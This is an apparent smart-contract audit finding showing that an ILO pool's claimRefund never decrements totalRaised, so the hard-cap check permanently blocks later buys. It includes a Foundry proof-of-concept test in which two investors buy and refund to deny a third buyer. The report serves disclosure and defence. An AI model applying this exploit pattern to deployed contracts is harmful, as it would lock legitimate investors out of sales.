# Vulnerability details

## Vulnerability Details

1. When an investor calls the <[buy] function> with specified raisedAmount, there's a check to ensure that the amount is within the Maximum sale cap for the sale. 
```
require(SaleInfo.hardCap - totalRaised >= raisedAmount, "HC")
```

2. After that check, the state variable `totalRaised` is incremented by this raisedAmount, and then investor's position is updated with this raisedAmount too

3. However, after 7 days where refund is possible, a malicious investor can call the `[claimRefund]` function: This function actually send a user's raisedAmount associated with his or her position back to the user, and then delete his or her position and burn his or her tokenId...

 But after transferring a user's raisedAmount to him or her, it should update the `totalRaised` state variable by decrementing it by the transferred raisedAmount. However it does not update it. 

4. What this means is that, although the malicious users may not have tokenId or nft in the system, but legitimate users who would like to purchase either a new nft or increase his or her position by buying more would not be able to do so because of the require check at L136.



## Impact
Any subsequent buys would fail, as legitimate investors would be denied even though the malicious investors has no nft or token in the IILO Pool. 

This will also denied the protocol of intended nfts they would have preferred to sell during a sale.

In fact, for any other sale, unless the saleCap is really set to a very high high value, there will never be any buys of nfts. 

This has then permanently led to DoS on the buy function. 

## Proof of Concept

Because of limit of Sale cap per user, malicious investor would have to use 2 different whitelisted recipient accounts to be able to completely DoS the buy function right after protocol deployment just as in my PoC. 

Add the below test to the ILOPool.t.sol file in the tests directory
```
function testMaliciousInvestorBrickBuy() external {
        deal(address(USDC), INVESTOR, 55000 ether);
        deal(address(USDC), INVESTOR_2, 55000 ether);
        deal(address(USDC), DUMMY_ADDRESS, 2000 ether);
        vm.startPrank(PROJECT_OWNER);
        IILOWhitelist(iloPool).batchWhitelist(_getListAddressFromAddress(INVESTOR));
        IILOWhitelist(iloPool).batchWhitelist(_getListAddressFromAddress(INVESTOR_2));
        IILOWhitelist(iloPool).batchWhitelist(_getListAddressFromAddress(DUMMY_ADDRESS));
        vm.stopPrank();
        vm.prank(INVESTOR);
        IERC20(USDC).approve(iloPool, 1000000000 ether);
        vm.prank(INVESTOR_2);
        IERC20(USDC).approve(iloPool, 1000000000 ether);
        (uint256 InvestorTokenId,) = _buyFor(INVESTOR, SALE_START+1, 50000 ether);
        (uint256 Investor2TokenId,) = _buyFor(INVESTOR_2, SALE_START+2, 50000 ether);
        // Noting the balances before
        uint256 balanceBeforeInvestor = IERC20(USDC).balanceOf(INVESTOR);
        uint256 balanceBeforeInvestor2 = IERC20(USDC).balanceOf(INVESTOR_2);

        vm.prank(INVESTOR);
        vm.warp(LAUNCH_START + 86400*7 + 1);
        IILOPool(iloPool).claimRefund(InvestorTokenId);
        // malicious investor gets back his exact amount he used to buy the nft with no fees
        uint256 balanceAfterInvestor = IERC20(USDC).balanceOf(INVESTOR);
        assertEq(balanceAfterInvestor - balanceBeforeInvestor, 50000 ether);

        vm.prank(INVESTOR_2);
        vm.warp(LAUNCH_START + 86400*7 + 1);
        IILOPool(iloPool).claimRefund(Investor2TokenId);
        // malicious investor2 also gets back his exact amount he used to buy the nft with no fees
        uint256 balanceAfterInvestor2 = IERC20(USDC).balanceOf(INVESTOR_2);
        assertEq(balanceAfterInvestor2 - balanceBeforeInvestor2, 50000 ether);

        // When DUMMY_ADDRESS tries to buy an NFT within the sale period, the pool will deny him
        vm.startPrank(DUMMY_ADDRESS);
        IERC20(USDC).approve(iloPool, 1000000000 ether);
        vm.warp(SALE_START + 1);
        vm.expectRevert();
        IILOPool(iloPool).buy(10 ether, DUMMY_ADDRESS);
        vm.stopPrank();
}
```
